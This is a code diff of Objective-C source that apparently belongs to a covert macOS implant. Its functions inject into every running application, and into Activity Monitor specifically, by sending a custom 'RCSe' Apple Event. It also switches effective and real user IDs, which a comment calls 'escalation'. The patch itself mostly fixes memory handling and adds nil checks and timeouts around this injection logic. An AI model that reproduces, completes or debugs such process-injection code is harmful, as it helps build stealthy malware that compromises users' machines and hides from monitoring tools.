@@ -3439,7 +3439,11 @@ void lionSendEventToPid(pid_t pidP)
 #ifdef DEBUG_CORE
           warnLog(@"find running ActivityMonitor with pid %d, injecting...", pActivityM);
 #endif
-          [self sendEventToPid: [pActivityM retain]];
+          NSNumber *thePid = [[NSNumber alloc] initWithInt: [pActivityM intValue]];
+          
+          [self sendEventToPid: thePid];
+          
+          [thePid release];
         }
       else 
         {
@@ -3514,6 +3518,9 @@ void lionSendEventToPid(pid_t pidP)
   int rUid = getuid();
   int maxRetry = 10;
 
+  if (thePid == nil)
+    return;
+
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
 
   // On lion fork to sendEvents without problem
@@ -3536,7 +3543,6 @@ void lionSendEventToPid(pid_t pidP)
       [aTask launch];
       [aTask release];
       [pidStr release];
-      [thePid release];
       
 #ifdef DEBUG_CORE
       verboseLog(@"task launched");
@@ -3574,18 +3580,19 @@ void lionSendEventToPid(pid_t pidP)
   if (eUid != rUid)
     seteuid(rUid);
 
+  [app setTimeout: 1];
   [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
   [app sendEvent: kASAppleScriptSuite
               id: kGetAEUT
       parameters: 0];
 
   sleep(1);
 
-  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
-
+  
   NSNumber *pid = [NSNumber numberWithInt: getpid()];
-
+  
+  [app setTimeout: 1];
+  [app setSendMode: kAENoReply | kAENeverInteract | kAEDontRecord];
   id injectReply = [app sendEvent: 'RCSe'
                                id: eventID
                        parameters: 'pido', pid, 0];
@@ -3625,8 +3632,6 @@ void lionSendEventToPid(pid_t pidP)
 #endif
     }
 
-  [thePid release];
-
   [pool release];  
 }
 
@@ -3643,12 +3648,18 @@ void lionSendEventToPid(pid_t pidP)
       for (int i=0; i<[apps count]; i++) 
         {
           NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
-          NSNumber *thePid = [[NSNumber alloc] initWithInt: [app processIdentifier]];
+          
+          pid_t tmpPid = [app processIdentifier];
+          
+          NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+          
 #ifdef DEBUG_CORE
         infoLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
               [app localizedName], [app processIdentifier]);
 #endif
           [self sendEventToPid:thePid]; 
+          
+          [thePid release];
           
           usleep(500);
         }
@@ -3716,6 +3727,12 @@ void lionSendEventToPid(pid_t pidP)
   
   NSDictionary *appInfo = [notification userInfo];
 
+  if (appInfo == nil)
+    {
+      [pool release];
+      return;
+    }
+  
 #ifdef DEBUG_CORE
   infoLog(@"running new notificaion on app %@ ", appInfo);
 #endif
@@ -3756,12 +3773,14 @@ void lionSendEventToPid(pid_t pidP)
       infoLog(@"sendEventToPid");
 #endif
       // temporary thread for fixing euid/uid escalation
-      [NSThread detachNewThreadSelector: @selector(sendEventToPid:) 
-                               toTarget: self 
-                             withObject: [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] retain]];
+      pid_t tmpPid =  [[appInfo objectForKey: @"NSApplicationProcessIdentifier"] intValue];
+      NSNumber *thePid = [[NSNumber alloc] initWithInt: tmpPid];
+     
+     [self sendEventToPid: thePid];
+     
+     [thePid release];
     }
     
-  
   [pool release];
 }
 
